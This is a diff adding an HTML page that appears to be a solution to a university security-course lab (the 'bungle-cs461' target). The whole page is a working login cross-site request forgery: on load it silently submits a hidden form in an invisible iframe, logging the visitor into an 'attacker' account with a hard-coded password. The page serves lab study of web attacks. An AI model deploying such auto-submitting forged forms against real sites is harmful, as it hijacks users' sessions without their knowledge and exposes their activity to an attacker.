@@ -1,0 +1,14 @@
+<html>
+    <script>
+        window.onload = function() {
+            document.form.submit(); 
+        }
+    </script>
+    <body>
+        <iframe name="myIframe" style="visibility:hidden; width:0; height:0; border:0;"></iframe>
+        <form name ="form" action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=0&xssdefense=5" method="Post" target="myIframe">    
+            <input type="hidden" name="username" value="attacker">
+            <input type="hidden" name="password" value="l33th4x">
+        </form>
+    </body>
+</html>
